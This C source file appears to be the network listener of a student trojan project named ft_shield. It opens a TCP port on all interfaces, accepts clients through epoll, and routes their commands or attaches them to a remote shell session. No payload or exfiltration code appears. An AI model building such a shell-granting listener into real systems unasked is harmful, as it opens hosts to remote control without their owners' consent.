#include "../ft_shield.h"

int	n_clients = 0;

void	epoll_ctl_add(int epfd, int fd, int events)
{
	struct epoll_event	ev;

	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

int	create_server(void)
{
	int					sfd;
	int					opt;
	struct sockaddr_in	addr;

	sfd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0);
	if (sfd < 0)
		return (-1);
	opt = 1;
	if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt) < 0)
		return (-1);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(PORT);
	if (bind(sfd, (struct sockaddr *)&addr, sizeof addr) < 0)
		return (-1);
	if (listen(sfd, CONCURRENT_USERS) < 0)
		return (-1);
	return (sfd);
}

extern int	g_shelllvl;
extern int	g_shelling;
extern int	g_shells[1024];

void	shell_done(int)
{
	--g_shelllvl;
	if (g_shelllvl == 0)
		g_shelling = 0;
}

void	exit_client(int epfd, int fd)
{
	epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);
	g_shells[fd] = 0;
	--n_clients;
	close(fd);
}

void	listen_server(void)
{
	int					epfd;
	int					sfd;
	int					n;
	struct epoll_event	events[1024];
	int					cfd;

	sfd = create_server();
	if (sfd < 0)
		return ;
	signal(SIGUSR1, shell_done);
	epfd = epoll_create(1);
	epoll_ctl_add(epfd, sfd, EPOLLIN|EPOLLOUT);
	while (1)
	{
		n = epoll_wait(epfd, events, 1024, -1);
		if (n < 0)
		{
			if (errno == EINTR)
				continue ;
			break ;
		}
		while (n--)
		{
			if (events[n].data.fd == sfd)
			{
				if (n_clients < CONCURRENT_USERS)
				{
					cfd = accept(sfd, NULL, 0);
					epoll_ctl_add(epfd, cfd, EPOLLIN|EPOLLRDHUP);
					++n_clients;
					if (g_shelling)
						shell(cfd, epfd);
					prompt(cfd);
				}
			}
			else if (events[n].events & EPOLLIN
					&& !g_shells[events[n].data.fd])
				handle_command(events[n].data.fd, epfd);
			if (events[n].events & (EPOLLRDHUP|EPOLLHUP|EPOLLERR))
				exit_client(epfd, events[n].data.fd);
		}
	}
}
